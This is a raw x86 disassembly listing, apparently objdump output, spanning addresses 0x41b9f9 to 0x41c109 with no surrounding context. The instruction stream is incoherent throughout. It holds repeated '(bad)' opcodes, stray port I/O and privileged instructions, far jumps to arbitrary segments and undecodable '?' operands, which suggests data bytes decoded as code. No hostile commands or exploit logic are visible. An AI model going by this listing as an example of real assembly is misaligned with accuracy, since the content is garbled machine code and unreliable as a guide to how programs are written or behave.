  41b9f9:	or     ebp,DWORD PTR [ecx+0x5682d0a8]
  41b9ff:	push   ebp
  41ba00:	pop    es
  41ba01:	sub    ebp,DWORD PTR [esi]
  41ba03:	ds mov bl,0xa
  41ba06:	push   edx
  41ba07:	jle    0x41b999
  41ba09:	popa   
  41ba0a:	or     ch,BYTE PTR [ebp-0xc]
  41ba0d:	mov    eax,0x861758e
  41ba12:	out    0x6d,al
  41ba14:	shl    DWORD PTR [ebp+0x18],0x5d
  41ba18:	mov    cl,0xcd
  41ba1a:	inc    eax
  41ba1b:	add    eax,0x7a5d1f37
  41ba20:	imul   esp,DWORD PTR [ebx+eiz*1],0x15
  41ba24:	xchg   esp,eax
  41ba25:	lahf   
  41ba26:	push   0xffffffe2
  41ba28:	sbb    edx,DWORD PTR [ecx-0x303f3b25]
  41ba2e:	jl     0x41ba1f
  41ba30:	sti    
  41ba31:	iret   
  41ba32:	cli    
  41ba33:	and    dl,bl
  41ba35:	int3   
  41ba36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba37:	push   esi
  41ba38:	mov    esp,0xa25a9046
  41ba3d:	and    DWORD PTR [edi],ebp
  41ba3f:	inc    ebx
  41ba40:	cs test eax,0xec993b0c
  41ba46:	arpl   WORD PTR [esi-0x7ac6f7c1],sp
  41ba4c:	in     al,0xe4
  41ba4e:	jge    0x41ba13
  41ba50:	dec    edi
  41ba51:	into   
  41ba52:	mov    DWORD PTR [ecx-0x3e4dd1a8],ebx
  41ba58:	mov    ds:0x3f55a926,eax
  41ba5d:	out    0xdf,al
  41ba5f:	(bad)  
  41ba60:	push   esp
  41ba61:	cld    
  41ba62:	shl    BYTE PTR [ecx-0x620e3349],1
  41ba68:	das    
  41ba69:	mov    bh,0x38
  41ba6b:	js     0x41ba66
  41ba6d:	add    cl,ah
  41ba6f:	pop    edi
  41ba70:	(bad)  
  41ba72:	xchg   ebp,eax
  41ba73:	icebp  
  41ba74:	add    BYTE PTR [eax-0x7d0fdb05],0xf7
  41ba7b:	mov    edx,0x1f6592c4
  41ba80:	mul    DWORD PTR ds:0x1fc63d64
  41ba86:	inc    ecx
  41ba87:	inc    esi
  41ba88:	mov    cl,0x1e
  41ba8a:	and    eax,0x55c934a4
  41ba8f:	retf   0x478
  41ba92:	shl    DWORD PTR [ebp-0x31],cl
  41ba95:	push   es
  41ba96:	in     al,0x29
  41ba98:	fisttp DWORD PTR [edx-0x56]
  41ba9b:	stos   BYTE PTR es:[edi],al
  41ba9c:	cdq    
  41ba9d:	or     al,0xa7
  41ba9f:	sar    DWORD PTR ds:0x45d2245f,0xf9
  41baa6:	mov    ch,0xc2
  41baa8:	jae    0x41ba86
  41baaa:	mov    ah,0xa2
  41baac:	mov    ds:0xb39df0d3,eax
  41bab1:	sub    BYTE PTR [edi+ebx*2],al
  41bab4:	fstp   DWORD PTR [edi]
  41bab6:	pop    ecx
  41bab7:	pcmpeqd mm5,QWORD PTR [ebp-0x3e18795]
  41babe:	es repz mov edx,ebx
  41bac2:	shl    DWORD PTR [ecx+ebx*2],0x20
  41bac6:	jmp    0xa7001faa
  41bacb:	lock (bad) 
  41bacd:	in     eax,0x44
  41bacf:	repnz loopne 0x41ba82
  41bad2:	cmp    eax,DWORD PTR [ebp-0x65]
  41bad5:	mov    bh,0x10
  41bad7:	and    cl,BYTE PTR [ebx-0x16]
  41bada:	xlat   BYTE PTR ds:[ebx]
  41badb:	inc    esi
  41badc:	inc    DWORD PTR [ecx+esi*2+0xb]
  41bae0:	xor    esp,DWORD PTR [ecx+0x2c]
  41bae3:	pop    ebp
  41bae4:	add    eax,0xc08786ac
  41bae9:	push   esp
  41baea:	push   esp
  41baeb:	cli    
  41baec:	inc    esi
  41baed:	jns    0x41bad2
  41baef:	add    edx,DWORD PTR [ecx]
  41baf1:	rcr    dl,0xae
  41baf4:	dec    esp
  41baf5:	push   0x8756c5e7
  41bafa:	jae    0x41bb3b
  41bafc:	ret    
  41bafd:	dec    ecx
  41bafe:	dec    edx
  41baff:	jno    0x41bab9
  41bb01:	loop   0x41ba99
  41bb03:	pop    ecx
  41bb04:	enter  0x8fdc,0xe7
  41bb08:	ret    
  41bb09:	test   BYTE PTR [esi],0xbf
  41bb0c:	xchg   esp,eax
  41bb0d:	in     al,dx
  41bb0e:	pushf  
  41bb0f:	iret   
  41bb10:	pusha  
  41bb11:	leave  
  41bb12:	cmp    DWORD PTR [eax-0x7a85deb4],esi
  41bb18:	popa   
  41bb19:	ss pop ebp
  41bb1b:	pop    ds
  41bb1c:	outs   dx,DWORD PTR ds:[esi]
  41bb1d:	mov    bl,0xe4
  41bb1f:	dec    edi
  41bb20:	outs   dx,DWORD PTR ds:[esi]
  41bb21:	jg     0x41bb66
  41bb23:	xchg   ebx,eax
  41bb24:	test   BYTE PTR [edx],bl
  41bb26:	scas   al,BYTE PTR es:[edi]
  41bb27:	mov    al,ds:0x721187c5
  41bb2c:	xchg   edx,eax
  41bb2d:	outs   dx,DWORD PTR ds:[esi]
  41bb2e:	jmp    ecx
  41bb30:	mov    ebx,0x6d638868
  41bb35:	xor    BYTE PTR [ebp-0x36],bh
  41bb38:	aad    0xbb
  41bb3a:	int3   
  41bb3b:	retf   0xe695
  41bb3e:	xchg   esi,eax
  41bb3f:	inc    ebx
  41bb40:	pop    ebx
  41bb41:	push   ecx
  41bb42:	pop    ecx
  41bb43:	cmp    ah,al
  41bb45:	cs add al,0x84
  41bb48:	pop    edx
  41bb49:	int    0x20
  41bb4b:	pop    ds
  41bb4c:	ja     0x41bba8
  41bb4e:	inc    ecx
  41bb4f:	xchg   edx,eax
  41bb50:	fdiv   st,st(7)
  41bb52:	jne    0x41bb5d
  41bb54:	mov    esi,0x21881264
  41bb59:	sbb    BYTE PTR [edi-0x3d],bl
  41bb5c:	in     al,0xa6
  41bb5e:	leave  
  41bb5f:	retf   
  41bb60:	shl    BYTE PTR [ecx],cl
  41bb62:	mov    dl,0x0
  41bb64:	sbb    BYTE PTR [ebp+0x78],cl
  41bb67:	push   cs
  41bb68:	ja     0x41bb5b
  41bb6a:	repz sbb dl,BYTE PTR [esi+0x7c]
  41bb6e:	scas   al,BYTE PTR es:[edi]
  41bb6f:	sbb    bl,BYTE PTR [edi]
  41bb71:	and    eax,0xc7f9f2a5
  41bb76:	push   0xc789b53
  41bb7b:	ds in  eax,0x37
  41bb7e:	bsr    ebx,DWORD PTR [ebx-0x80]
  41bb82:	and    BYTE PTR [edx-0x24],dl
  41bb85:	(bad)  
  41bb86:	cli    
  41bb87:	pop    esi
  41bb88:	push   esi
  41bb89:	ret    0x194e
  41bb8c:	cmc    
  41bb8d:	rol    DWORD PTR [ebp-0xf496512],cl
  41bb93:	sub    al,0x1
  41bb95:	lock push esp
  41bb97:	inc    ecx
  41bb98:	jg     0x41bb69
  41bb9a:	out    0xc8,al
  41bb9c:	outs   dx,BYTE PTR ds:[esi]
  41bb9d:	cmp    ebp,edi
  41bb9f:	jns    0x41bc17
  41bba1:	rcr    BYTE PTR [ebp+0x37050ca9],1
  41bba7:	sub    ch,cl
  41bba9:	pop    es
  41bbaa:	repnz daa 
  41bbac:	pop    esp
  41bbad:	pushf  
  41bbae:	loopne 0x41bbda
  41bbb0:	cmp    ebx,DWORD PTR [eax+0x52c833e7]
  41bbb6:	loopne 0x41bb58
  41bbb8:	xor    bl,BYTE PTR [ebp+0x766c408e]
  41bbbe:	test   al,0x2e
  41bbc0:	pop    edx
  41bbc1:	aad    0x3a
  41bbc3:	dec    DWORD PTR ds:0xea7c2405
  41bbc9:	lahf   
  41bbca:	and    eax,edx
  41bbcc:	jnp    0x41bbde
  41bbce:	data16 jbe 0x41bbe5
  41bbd1:	neg    BYTE PTR [edx]
  41bbd3:	rcl    BYTE PTR [edx+ebx*2-0x1244b6e7],cl
  41bbda:	sub    al,0x4c
  41bbdd:	inc    ecx
  41bbde:	(bad)  [ecx]
  41bbe0:	imul   ecx,DWORD PTR [edi],0xef18b28d
  41bbe6:	int3   
  41bbe7:	cmp    cl,BYTE PTR [ebx-0x15ce4952]
  41bbed:	es and eax,0xd84f05cd
  41bbf3:	fs mov dh,0xcd
  41bbf6:	adc    BYTE PTR [ebp-0x7228eb0c],0x3
  41bbfd:	loop   0x41bc28
  41bbff:	jmp    0x2f76:0xbd6051ba
  41bc06:	out    dx,al
  41bc07:	jns    0x41bbd0
  41bc09:	mov    dl,0x5d
  41bc0b:	add    eax,0xfe7af3be
  41bc10:	je     0x41bc8e
  41bc12:	aam    0x57
  41bc14:	ss xchg ebx,eax
  41bc16:	cmc    
  41bc17:	xchg   ecx,eax
  41bc18:	cld    
  41bc19:	xor    ecx,DWORD PTR [esi+edx*4]
  41bc1c:	loopne 0x41bbb1
  41bc1e:	sbb    BYTE PTR [ecx],0x38
  41bc21:	retf   
  41bc22:	cli    
  41bc23:	sub    eax,0xc300b15d
  41bc28:	jl     0x41bbf8
  41bc2a:	inc    esi
  41bc2b:	xlat   BYTE PTR ds:[ebx]
  41bc2c:	inc    eax
  41bc2d:	outs   dx,BYTE PTR ds:[esi]
  41bc2e:	scas   al,BYTE PTR es:[edi]
  41bc2f:	mov    edx,edi
  41bc31:	mov    ah,0xf0
  41bc33:	arpl   WORD PTR [ebx],bx
  41bc35:	sub    DWORD PTR [ecx-0x5845fc31],0x7c395484
  41bc3f:	shl    BYTE PTR [eax],cl
  41bc41:	mov    ebx,0x53a31c9
  41bc46:	outs   dx,DWORD PTR ds:[esi]
  41bc47:	add    ch,BYTE PTR [ebp-0x2d]
  41bc4a:	and    ch,BYTE PTR [edi+0x69ad52bc]
  41bc50:	data16 and BYTE PTR [ecx+0x4f40cd21],ah
  41bc57:	jnp    0x41bc45
  41bc59:	jne    0x41bc42
  41bc5b:	jbe    0x41bca1
  41bc5d:	push   ecx
  41bc5e:	addr16 jnp 0x41bbe3
  41bc61:	ret    
  41bc62:	loope  0x41bbec
  41bc64:	ins    BYTE PTR es:[edi],dx
  41bc65:	push   ss
  41bc66:	cmp    DWORD PTR [edx+ebx*8-0x6d],esi
  41bc6a:	and    al,0xc1
  41bc6c:	icebp  
  41bc6d:	sbb    ebx,DWORD PTR [esi]
  41bc6f:	and    ecx,DWORD PTR [ebp+0x7a]
  41bc72:	xlat   BYTE PTR ds:[ebx]
  41bc73:	pop    es
  41bc74:	add    BYTE PTR [edi],ch
  41bc76:	mov    eax,ds:0xba7de4cf
  41bc7b:	fwait
  41bc7c:	cdq    
  41bc7d:	mov    al,0x47
  41bc7f:	fadd   st(6),st
  41bc81:	sbb    edx,DWORD PTR [ebp-0x13fee6f7]
  41bc87:	nop
  41bc88:	xchg   DWORD PTR [esi-0x3e],eax
  41bc8b:	jne    0x41bc16
  41bc8d:	push   esi
  41bc8e:	popa   
  41bc8f:	ja     0x41bc53
  41bc91:	fstp   QWORD PTR [eax-0xbfab77]
  41bc97:	mov    edx,0xaee63958
  41bc9c:	jns    0x41bd1a
  41bc9e:	fs test al,0xdb
  41bca1:	jno    0x41bc8d
  41bca3:	xchg   esi,eax
  41bca4:	loope  0x41bcd2
  41bca6:	xor    ebp,DWORD PTR [ebx]
  41bca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bca9:	pop    ebp
  41bcaa:	int    0x9b
  41bcac:	jnp    0x41bc8f
  41bcae:	test   al,0x65
  41bcb0:	push   esi
  41bcb1:	cli    
  41bcb2:	adc    bh,BYTE PTR [ebp-0x47]
  41bcb5:	xchg   esi,eax
  41bcb6:	and    edx,esi
  41bcb8:	lds    edx,FWORD PTR es:[ecx-0x46fc1cf9]
  41bcbf:	aam    0x39
  41bcc1:	xor    BYTE PTR [edx],0x86
  41bcc4:	idiv   DWORD PTR [ecx+0x15f94f1d]
  41bcca:	scas   eax,DWORD PTR es:[edi]
  41bccb:	jno    0x41bc82
  41bccd:	push   ds
  41bcce:	je     0x41bd24
  41bcd0:	jle    0x41bc89
  41bcd2:	push   ds
  41bcd3:	mov    ebp,DWORD PTR [ebx+ebx*1-0x3a]
  41bcd7:	add    ch,BYTE PTR [ebx]
  41bcd9:	xchg   edx,eax
  41bcda:	mov    WORD PTR [esi],ds
  41bcdc:	pop    ecx
  41bcdd:	test   DWORD PTR [ecx],ebp
  41bcdf:	mov    eax,0x5aa62481
  41bce4:	scas   al,BYTE PTR es:[edi]
  41bce5:	add    DWORD PTR [eax+0x6c],esp
  41bce8:	cmp    al,0x5a
  41bcea:	inc    ebx
  41bcec:	std    
  41bced:	add    eax,0x8068d16c
  41bcf2:	icebp  
  41bcf3:	jle    0x41bccc
  41bcf5:	inc    ebp
  41bcf6:	popf   
  41bcf7:	pop    ecx
  41bcf8:	adc    eax,0x1c2b6d36
  41bcfd:	lods   eax,DWORD PTR ds:[esi]
  41bcfe:	mov    ds:0x3f2caf77,eax
  41bd03:	lea    esi,[ebx+0x5b]
  41bd06:	xchg   BYTE PTR [edx-0x34],ah
  41bd09:	push   0xffffffbe
  41bd0b:	or     DWORD PTR [edx-0x69],edi
  41bd0e:	sbb    DWORD PTR [ecx+0x577cdda],esi
  41bd14:	out    0xd0,al
  41bd16:	inc    ebx
  41bd17:	push   esi
  41bd18:	out    dx,al
  41bd19:	int3   
  41bd1a:	loop   0x41bd83
  41bd1c:	jo     0x41bd59
  41bd1e:	fld    st(3)
  41bd20:	pushf  
  41bd21:	xchg   ebp,eax
  41bd22:	push   esp
  41bd23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd24:	mov    esp,0xa30b7abf
  41bd29:	jae    0x41bcfa
  41bd2b:	lahf   
  41bd2c:	xor    eax,0xe8a6889a
  41bd31:	add    al,0x33
  41bd33:	aad    0x6f
  41bd35:	or     al,0x9c
  41bd37:	mov    ebp,0xef3526cd
  41bd3c:	retf   
  41bd3d:	sub    ebx,DWORD PTR [ebx-0x6b925d9b]
  41bd43:	inc    ebp
  41bd44:	inc    ebp
  41bd45:	es mov esi,0xe5c828df
  41bd4b:	rcr    BYTE PTR [esi],1
  41bd4d:	push   cs
  41bd4e:	mov    BYTE PTR [esi],al
  41bd50:	loope  0x41bd66
  41bd52:	js     0x41bdcd
  41bd54:	mov    ch,0xff
  41bd56:	pop    esi
  41bd57:	pop    ebx
  41bd58:	dec    ebx
  41bd59:	pop    ss
  41bd5a:	lea    edx,[esi-0x14]
  41bd5d:	add    bh,ch
  41bd5f:	cli    
  41bd60:	popa   
  41bd61:	pop    ebx
  41bd62:	mov    ?,WORD PTR [ebx-0x7d]
  41bd65:	inc    edi
  41bd66:	xor    DWORD PTR [ecx-0x4b3401d8],ecx
  41bd6c:	cmp    DWORD PTR [ebp-0xd],ecx
  41bd6f:	sub    BYTE PTR [eax+0x10],0xaa
  41bd73:	pop    es
  41bd74:	mov    edx,0x168285f5
  41bd79:	or     al,0xdc
  41bd7b:	sub    DWORD PTR [eax+0x76d2d8f4],ebp
  41bd81:	cwde   
  41bd82:	cli    
  41bd83:	jae    0x41bd94
  41bd85:	cmp    ebp,ebx
  41bd87:	cmp    BYTE PTR [edi+esi*8-0x3f],cl
  41bd8b:	or     eax,0xdcec1e68
  41bd90:	das    
  41bd91:	mov    eax,0x1dc2dfa
  41bd96:	bound  edx,QWORD PTR [ebx-0x4a5e0de1]
  41bd9c:	cld    
  41bd9d:	mov    edx,0x47f0284b
  41bda2:	out    dx,eax
  41bda3:	jne    0x41be1c
  41bda5:	inc    esp
  41bda6:	dec    edi
  41bda7:	sub    DWORD PTR [esi],edi
  41bda9:	mov    ch,0xd2
  41bdab:	sub    ch,BYTE PTR cs:[ebp+0x63668e94]
  41bdb2:	jmp    0x41bdd9
  41bdb4:	jp     0x41bd70
  41bdb6:	mov    dl,0xaa
  41bdb8:	cld    
  41bdb9:	sub    edx,DWORD PTR [eax-0x1c]
  41bdbc:	stos   DWORD PTR es:[edi],eax
  41bdbd:	(bad)  
  41bdbe:	in     al,0xcb
  41bdc0:	aad    0xe7
  41bdc2:	fxch   st(6)
  41bdc4:	push   ecx
  41bdc5:	mov    ds:0x8063a0a6,al
  41bdca:	dec    ebp
  41bdcb:	sbb    eax,DWORD PTR [eax]
  41bdcd:	popa   
  41bdce:	retf   0x1cad
  41bdd1:	mov    bh,BYTE PTR [edx]
  41bdd3:	les    esp,FWORD PTR [ebp+0x6f]
  41bdd6:	out    0x2f,al
  41bdd8:	mov    ch,0x82
  41bdda:	ins    DWORD PTR es:[edi],dx
  41bddb:	cmp    eax,0x74e250e3
  41bde0:	jo     0x41be53
  41bde2:	adc    al,0x2e
  41bde4:	enter  0x8ff6,0x23
  41bde8:	gs cmc 
  41bdea:	dec    esp
  41bdeb:	mov    ecx,0xad308b8a
  41bdf0:	fld    QWORD PTR [ebx]
  41bdf2:	loop   0x41be26
  41bdf4:	adc    eax,0xb4b701da
  41bdf9:	add    eax,0x58fe1f42
  41bdfe:	test   eax,0x57b9e982
  41be03:	adc    BYTE PTR [edx],0xae
  41be06:	and    BYTE PTR [edi],ch
  41be08:	jno    0x41bdb8
  41be0a:	sahf   
  41be0b:	shr    esi,cl
  41be0d:	jg     0x41be0c
  41be0f:	or     eax,0xcf88e6ce
  41be14:	adc    bh,BYTE PTR [ebx+0x180ee29d]
  41be1a:	mov    dl,0xd1
  41be1c:	outs   dx,DWORD PTR ds:[esi]
  41be1d:	into   
  41be1e:	pop    esp
  41be1f:	xchg   esi,eax
  41be20:	mov    eax,0xf8a5d1fe
  41be25:	jnp    0x41bdfa
  41be27:	pop    ss
  41be28:	pop    ebx
  41be29:	test   BYTE PTR [edx-0x76223d2e],cl
  41be2f:	mov    esi,ecx
  41be31:	jnp    0x41be72
  41be33:	cs xchg bl,al
  41be36:	shr    edx,0x52
  41be39:	add    eax,0xe3847642
  41be3e:	jbe    0x41bdc7
  41be40:	je     0x41be4e
  41be42:	out    0x37,eax
  41be44:	push   ebp
  41be45:	dec    ebp
  41be46:	mov    esp,0xeab30a83
  41be4b:	in     al,0x3f
  41be4d:	jbe    0x41be10
  41be4f:	mov    dl,0xc2
  41be51:	das    
  41be52:	adc    esp,DWORD PTR [edi]
  41be54:	inc    edx
  41be55:	jae    0x41be0f
  41be57:	(bad)  
  41be58:	lock outs dx,DWORD PTR ds:[esi]
  41be5a:	cwde   
  41be5b:	jl     0x41beb7
  41be5d:	mov    dl,al
  41be5f:	imul   esi,DWORD PTR [edi+eax*2+0x748df25f],0x9
  41be67:	mov    ch,0x52
  41be69:	ja     0x41beb9
  41be6b:	mov    ds:0xba98eba5,eax
  41be70:	ror    ah,0x69
  41be73:	jne    0x41beed
  41be75:	xor    edi,DWORD PTR [edx+esi*8-0x242ec0e7]
  41be7c:	(bad)  
  41be7d:	out    0x68,eax
  41be7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be80:	stos   DWORD PTR es:[edi],eax
  41be81:	push   ebp
  41be82:	bound  ebp,QWORD PTR [edx]
  41be84:	and    al,0x1a
  41be86:	dec    edx
  41be87:	in     eax,0xa0
  41be89:	in     eax,dx
  41be8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be8b:	in     eax,dx
  41be8c:	loop   0x41bed6
  41be8e:	sub    edi,DWORD PTR [esi]
  41be90:	add    al,BYTE PTR [ecx+0x6298cbb5]
  41be96:	pusha  
  41be97:	(bad)  
  41be98:	in     al,dx
  41be99:	mov    al,ds:0xf44769a6
  41be9e:	mov    eax,DWORD PTR [ebx-0x3a]
  41bea1:	jno    0x41beae
  41bea3:	fs (bad) 
  41bea5:	and    esi,ebx
  41bea7:	cmp    ebx,esi
  41bea9:	add    eax,0x708e665f
  41beae:	dec    esi
  41beaf:	outs   dx,BYTE PTR ds:[esi]
  41beb0:	icebp  
  41beb1:	and    al,0x4c
  41beb3:	ror    BYTE PTR [edx],cl
  41beb5:	adc    DWORD PTR [eax+eax*2+0x2cd65e0f],esi
  41bebc:	sbb    al,0xae
  41bebe:	loope  0x41be9d
  41bec0:	push   0xff3c3392
  41bec5:	and    esi,DWORD PTR [ecx-0x73c5b080]
  41becb:	or     al,0x48
  41becd:	arpl   WORD PTR [ecx-0x5cfcd771],di
  41bed3:	mov    ah,0xa8
  41bed5:	pop    ebp
  41bed6:	mov    gs,ecx
  41bed8:	add    esi,ecx
  41beda:	sti    
  41bedb:	outs   dx,DWORD PTR ds:[esi]
  41bedc:	mov    bl,0x11
  41bede:	(bad)  
  41bedf:	aas    
  41bee0:	shr    DWORD PTR [eax],1
  41bee2:	ds push esp
  41bee4:	push   ecx
  41bee5:	loopne 0x41be8d
  41bee7:	in     al,dx
  41bee8:	xlat   BYTE PTR ds:[ebx]
  41bee9:	mov    bh,0x35
  41beeb:	(bad)  
  41beec:	aad    0x10
  41beee:	sbb    ch,BYTE PTR [ebx+0x4c]
  41bef1:	adc    DWORD PTR [edi-0xc6d154c],edx
  41bef7:	in     eax,dx
  41bef8:	cmp    al,BYTE PTR [edi+0x40]
  41befb:	dec    esi
  41befc:	pop    ebx
  41befd:	mov    edx,?
  41beff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf00:	test   DWORD PTR [ebx-0x26f03aac],esp
  41bf06:	lea    esp,[esi-0x4be572d3]
  41bf0c:	(bad)  
  41bf0d:	mov    ecx,0x10d1b225
  41bf12:	popa   
  41bf13:	jmp    0x1717cba9
  41bf18:	xlat   BYTE PTR ds:[ebx]
  41bf19:	ss mov bh,0xe9
  41bf1c:	mov    ah,0xb4
  41bf1e:	(bad)  
  41bf1f:	ds aad 0x42
  41bf22:	adc    al,0x41
  41bf24:	push   esi
  41bf25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf26:	mov    DWORD PTR [esi-0x3108ba90],esp
  41bf2c:	mov    edx,0xffa8057c
  41bf31:	(bad)  
  41bf32:	cmp    al,BYTE PTR [edi-0x1d]
  41bf35:	les    ebx,FWORD PTR [edi]
  41bf37:	push   ds
  41bf38:	outs   dx,DWORD PTR ds:[esi]
  41bf39:	int    0xa0
  41bf3b:	pop    ss
  41bf3c:	sbb    edx,ebp
  41bf3e:	aam    0x38
  41bf40:	out    0x16,eax
  41bf42:	setg   BYTE PTR [esi]
  41bf45:	mov    cl,0x55
  41bf47:	fmul   QWORD PTR ds:0x74cf8dd7
  41bf4d:	adc    eax,0x99ab656f
  41bf52:	or     esi,0x203cdb61
  41bf58:	pop    ecx
  41bf59:	or     DWORD PTR [esi-0x1c14401],esi
  41bf5f:	test   al,0x9d
  41bf61:	or     edi,DWORD PTR [eax+0x68]
  41bf64:	xlat   BYTE PTR ds:[ebx]
  41bf65:	lods   al,BYTE PTR ds:[esi]
  41bf66:	lock ficomp DWORD PTR [edx+0x13]
  41bf6a:	enter  0xcec8,0xbe
  41bf6e:	stos   BYTE PTR es:[edi],al
  41bf6f:	mov    esi,0x25f9555f
  41bf74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf75:	fnsave [eax+0x7a]
  41bf78:	pop    edx
  41bf79:	sbb    ch,al
  41bf7b:	and    DWORD PTR [edi-0x35],edi
  41bf7e:	je     0x41bf21
  41bf80:	push   eax
  41bf81:	aas    
  41bf82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf83:	sti    
  41bf84:	mov    dh,0x8d
  41bf86:	adc    bh,cl
  41bf88:	xchg   edx,eax
  41bf89:	mov    bh,0xf
  41bf8b:	cmp    bl,0x6b
  41bf8e:	repnz jmp 0x3e35:0x9e596b1d
  41bf96:	(bad)  
  41bf97:	pop    ecx
  41bf98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf99:	in     al,0xb7
  41bf9b:	or     al,0x11
  41bf9d:	test   eax,0x95fadba6
  41bfa2:	mov    edi,edi
  41bfa4:	push   0xffffffef
  41bfa6:	or     eax,0x89541700
  41bfab:	lock div BYTE PTR [ecx+0x32]
  41bfaf:	inc    esp
  41bfb0:	mov    DWORD PTR [edx-0x48],ebx
  41bfb3:	in     eax,dx
  41bfb4:	dec    edx
  41bfb5:	jmp    DWORD PTR [eax+0x1a]
  41bfb8:	stos   DWORD PTR es:[edi],eax
  41bfb9:	stos   DWORD PTR es:[edi],eax
  41bfba:	jle    0x41bfb4
  41bfbc:	or     dh,ah
  41bfbe:	fld    QWORD PTR [edi]
  41bfc0:	mov    dl,0x83
  41bfc2:	leave  
  41bfc3:	jle    0x41bf88
  41bfc5:	rol    BYTE PTR [esi],1
  41bfc7:	inc    esp
  41bfc8:	mov    ch,ch
  41bfca:	and    eax,0x5a17903f
  41bfcf:	adc    ebp,esp
  41bfd1:	xor    dl,BYTE PTR es:[ebx+0x1e14973d]
  41bfd8:	mov    esp,0xdb65400f
  41bfdd:	push   0x16
  41bfdf:	sbb    al,0x83
  41bfe1:	dec    ebx
  41bfe2:	test   BYTE PTR [eax-0x7a4ac62],dl
  41bfe8:	sbb    BYTE PTR [ebx],0xdc
  41bfeb:	jb     0x41bfa0
  41bfed:	pop    ss
  41bfee:	not    BYTE PTR [ecx+edi*4]
  41bff1:	or     eax,DWORD PTR [edi+0x4886ec92]
  41bff7:	mov    ds:0xd375fe84,al
  41bffc:	cwde   
  41bffd:	popf   
  41bffe:	pop    ecx
  41bfff:	xchg   ebp,eax
  41c000:	int3   
  41c001:	mov    al,ds:0x340661fd
  41c006:	and    DWORD PTR [ebp+0x7ca262cf],ecx
  41c00c:	pop    ss
  41c00d:	mov    WORD PTR [ecx+edi*4],ds
  41c010:	sbb    eax,0x46136523
  41c015:	bound  edx,QWORD PTR [ebx-0x60d4b12a]
  41c01b:	pop    ss
  41c01c:	enter  0x6e9,0x77
  41c020:	dec    esi
  41c021:	dec    edi
  41c022:	cmp    BYTE PTR [ebx+eiz*2+0x7d],bl
  41c026:	shl    cl,cl
  41c028:	leave  
  41c029:	pop    edi
  41c02a:	jge    0x41c09a
  41c02c:	mul    BYTE PTR [edx+0x39]
  41c02f:	mov    bl,0xb9
  41c031:	adc    DWORD PTR [ebx],ecx
  41c033:	mov    ch,0x62
  41c035:	push   ebx
  41c036:	iret   
  41c037:	ja     0x41c065
  41c039:	mov    bh,0x60
  41c03b:	or     ebx,DWORD PTR [eax]
  41c03d:	mov    WORD PTR [edx+0x3b],gs
  41c040:	out    dx,al
  41c041:	rol    DWORD PTR [esi],cl
  41c043:	(bad)  
  41c044:	in     al,0x4c
  41c046:	and    eax,DWORD PTR [eax]
  41c048:	ror    BYTE PTR [ebx-0x70c0d9eb],cl
  41c04e:	rcr    BYTE PTR [ecx],cl
  41c050:	dec    ebx
  41c051:	popa   
  41c052:	inc    edi
  41c053:	add    al,dh
  41c055:	jmp    0x5c3e:0xa78ec319
  41c05c:	retf   0xaf8
  41c05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c060:	pop    edi
  41c061:	ret    
  41c062:	xor    al,0x42
  41c064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c065:	aam    0x4d
  41c067:	inc    edx
  41c068:	loopne 0x41c054
  41c06a:	adc    BYTE PTR [esi+0x73],bh
  41c06d:	xor    al,0xf9
  41c06f:	mov    cl,0xf
  41c071:	adc    al,0xf7
  41c073:	xchg   ebp,eax
  41c074:	scas   eax,DWORD PTR es:[edi]
  41c075:	ret    0x7c22
  41c078:	stos   BYTE PTR es:[edi],al
  41c079:	dec    ebx
  41c07a:	pop    ecx
  41c07b:	stc    
  41c07c:	out    dx,al
  41c07d:	out    0x3e,eax
  41c07f:	cli    
  41c080:	push   edi
  41c081:	mul    DWORD PTR [edx-0x6f]
  41c084:	xchg   esp,eax
  41c085:	(bad)  
  41c086:	mov    edi,0xdec54853
  41c08b:	mov    bh,0x18
  41c08d:	outs   dx,BYTE PTR ds:[esi]
  41c08e:	out    0x61,eax
  41c090:	stos   BYTE PTR es:[edi],al
  41c091:	push   edx
  41c092:	mov    ebp,DWORD PTR [eax-0x117bac28]
  41c098:	xchg   ebx,eax
  41c099:	xchg   ecx,eax
  41c09a:	pop    es
  41c09b:	push   0x1e5e464d
  41c0a0:	ins    BYTE PTR es:[edi],dx
  41c0a1:	aam    0xfd
  41c0a3:	stc    
  41c0a4:	leave  
  41c0a5:	mul    ebp
  41c0a7:	mov    esi,0x1c5af25
  41c0ac:	nop
  41c0ad:	test   DWORD PTR [esi],0x1fb0b5b9
  41c0b3:	mov    ch,0xa9
  41c0b5:	test   al,0x17
  41c0b7:	stos   WORD PTR es:[edi],ax
  41c0b9:	aaa    
  41c0ba:	js     0x41c126
  41c0bc:	arpl   dx,bp
  41c0be:	fs inc eax
  41c0c0:	into   
  41c0c1:	repz add ecx,0xfffffff2
  41c0c5:	cmp    eax,0x537d8997
  41c0ca:	pop    ss
  41c0cb:	jmp    0xa792:0xe042657
  41c0d2:	lock pop eax
  41c0d4:	mov    bl,0x88
  41c0d6:	mov    al,0xfd
  41c0d8:	xchg   edx,eax
  41c0d9:	ficom  WORD PTR [edi]
  41c0db:	dec    esi
  41c0dc:	test   BYTE PTR [eax],bh
  41c0de:	fldcw  WORD PTR ds:0xeb1f80c5
  41c0e4:	push   esi
  41c0e5:	add    BYTE PTR [ebx+ebx*2+0x18],ah
  41c0e9:	popa   
  41c0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0eb:	push   esi
  41c0ec:	retf   
  41c0ed:	into   
  41c0ee:	adc    BYTE PTR [esi-0x71],0x7c
  41c0f2:	pop    ds
  41c0f3:	xor    esi,DWORD PTR [eax+0x3f]
  41c0f6:	bound  edx,QWORD PTR [ebp+eax*2+0x28]
  41c0fa:	mov    ebx,0xa47ab816
  41c0ff:	lea    edi,[edi-0x28716a7f]
  41c105:	jnp    0x41c103
  41c107:	fdivr  st,st(6)
  41c109:	lds    esp,FWORD PTR [ebx]
